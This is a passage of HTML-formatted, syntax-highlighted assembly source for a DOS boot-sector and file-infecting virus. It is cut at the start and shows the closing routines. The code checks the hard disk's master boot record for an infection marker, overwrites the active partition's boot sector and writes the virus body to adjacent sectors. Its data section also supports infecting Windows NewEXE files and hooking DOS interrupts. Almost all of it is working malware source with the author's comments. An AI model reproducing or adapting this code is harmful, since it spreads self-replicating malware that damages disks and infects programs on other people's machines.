                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_read</span><span class="sc0">                 </span><span class="sc1">; read the MBR</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">hderror</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">table_check</span><span class="sc0">             </span><span class="sc1">; find active partition</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">hderror</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">; no carry -&gt; read</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_read</span><span class="sc0">                         </span><span class="sc1">; read boot sector</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">boot_check</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'US'</span><span class="sc0"> </span><span class="sc1">; already infected?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">hderror</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_boot_data</span><span class="sc0">                  </span><span class="sc1">; copy boot stuff</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">fromfloppy</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_read</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; save body of the virus</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">second_part_start</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_read</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                         </span><span class="sc1">; next part</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_read</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                         </span><span class="sc1">; next part</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_read</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                           </span><span class="sc1">; put virus boot</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_read</span><span class="sc0">
</span><span class="sc5">hderror</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">copy_boot_data</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; copy cool boot stuff</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03bh</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">table_check</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; finds the first bootable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; partition and put in</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01beh</span><span class="sc0">                </span><span class="sc1">; DX and CX the head,</span><span class="sc0">
                                                </span><span class="sc1">; sector and cylinder</span><span class="sc0">
                                                </span><span class="sc1">; (in the format as int</span><span class="sc0">
                                                </span><span class="sc1">; 13h wants)</span><span class="sc0">
</span><span class="sc5">ptable_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">080h</span><span class="sc0">   </span><span class="sc1">; is bootable?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">boot_found</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">                 </span><span class="sc1">; next partition</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ptable_loop</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; all partition examined</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; but no active. leave</span><span class="sc0">
                                                </span><span class="sc1">; with carry as error</span><span class="sc0">
</span><span class="sc5">boot_found</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; sector + cyl</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filebuffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; and point on buffer</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_attributes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0143h</span><span class="sc0">                </span><span class="sc1">; no flags</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; if Carry is set then this will do a WRITE on the HD</span><span class="sc0">
                </span><span class="sc1">; if Carry isn't set then a READ will be executed</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rw_struct</span><span class="sc0">     </span><span class="sc1">; point to the structure</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; needed by 440dh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; store in the structure</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">; as needed</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">                 </span><span class="sc1">; select between write (41h)</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">do_rwop</span><span class="sc0">                 </span><span class="sc1">; and read (61h)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">do_rwop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">          </span><span class="sc1">; 08h = disk drive</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">440dh</span><span class="sc0">        </span><span class="sc1">; IOCTL generic block device req</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; on C:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; point to structure</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rw_struct</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; read write structure</span><span class="sc0">
</span><span class="sc5">fix_byte</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">head_word</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">cyl_word</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">sec_word</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">nr_word</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0001h</span><span class="sc0">           </span><span class="sc1">; one sector at once. I think</span><span class="sc0">
</span><span class="sc5">where_off</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; that this is a bug, because</span><span class="sc0">
</span><span class="sc5">where_seg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; DOS doesn't want to write/read</span><span class="sc0">
                                        </span><span class="sc1">; more than one sectore at once :(</span><span class="sc0">
                                        </span><span class="sc1">; or at least on all the machined</span><span class="sc0">
                                        </span><span class="sc1">; i tested it wasn't working :(((</span><span class="sc0">
                                        </span><span class="sc1">; so we will write/read one sector</span><span class="sc0">
                                        </span><span class="sc1">; at once</span><span class="sc0">

</span><span class="sc5">relocitem</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; relocation item for NewEXEs</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winip</span><span class="sc0">
</span><span class="sc5">old_cs</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">old_ip</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">relocitem_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; end of the virus in the file</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">winexe_data</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; data needed for newexe</span><span class="sc0">
</span><span class="sc5">newexe_off</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; infection</span><span class="sc0">
</span><span class="sc5">al_shift</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ne_size</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">last_ne</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lseek</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lseek_add</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">int21set</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09h</span><span class="sc0">               </span><span class="sc1">; Int 21h set flag</span><span class="sc0">

</span><span class="sc5">old_int24_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; original int24 offset</span><span class="sc0">
</span><span class="sc5">old_int24_seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; original int24 segment</span><span class="sc0">

</span><span class="sc5">tmpcounter</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">               </span><span class="sc1">; counter for 4eh/4fh infection</span><span class="sc0">

</span><span class="sc5">filenameoff</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; stuff for 4eh/4fh infection</span><span class="sc0">
</span><span class="sc5">filedotoff</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4ch</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">lenax</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; lenght of the file</span><span class="sc0">
</span><span class="sc5">lendx</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">filebuffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; buffer for r/w operations</span><span class="sc0">

</span><span class="sc5">file_att</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; file attributes</span><span class="sc0">

</span><span class="sc1">; end of the virus in memory</span><span class="sc0">
</span><span class="sc5">virus_end_mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
